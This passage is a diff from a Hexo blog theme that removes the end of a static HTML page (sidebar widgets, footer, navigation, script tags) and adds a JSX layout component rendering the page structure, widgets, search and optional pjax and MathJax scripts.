href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">路径劫持</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2023/09/18/hello-world/">Hello World</a>
-          </li>
-        
-          <li>
-            <a href="/2023/09/18/home/">home</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/30/linux%E6%8F%90%E6%9D%83/">linux提权</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/19/venus/">venus</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/11/flower/">flower</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2023 honkerZ<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+        let isPageOrPost = page.layout == 'page' || page.layout == 'post';
+        return <html lang={language ? language.substr(0, 2) : ''}>
+            <Head site={site} config={config} helper={helper} page={page} />
+            <body className={`is-${columnCount}-column has-navbar-fixed-top`}>
+                <Navbar config={config} helper={helper} page={page} />
+                <script type="text/javascript" src={my_cdn(url_for('/js/theme-setting.js'))}></script>
+                <section class="section">
+                    <div class="container">
+                        <div class="columns">
+                            <div class={classname({
+                                column: true,
+                                'order-2': true,
+                                'column-main': true,
+                                'is-12': columnCount === 1,
+                                'is-8-tablet is-8-desktop is-6-widescreen': (page.layout != 'post' && page.layout != 'page') && columnCount === 3,
+                                'is-8-tablet is-8-desktop is-9-widescreen': columnCount === 2 || page.layout === 'post'
+                            })} dangerouslySetInnerHTML={{__html: indexTopData + body}}></div>
+                            <Widgets site={site} config={config} helper={helper} page={page} position={'left'}/>
+                            {isPageOrPost ? null : <Widgets site={site} config={config} helper={helper} page={page} position={'right'}/>}
+                        </div>
+                    </div>
+                </section>
+                <Footer config={config} helper={helper} />
+                <Scripts site={site} config={config} helper={helper} page={page} />
+                <Search config={config} helper={helper} />
+                {use_pjax ? <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script> : null}
+                {use_pjax ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: pjaxJs }}></script> : null}
+                {isMath ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: mathJaxJs }}></script> : null}
+            </body>
+        </html>;
+    }
+};
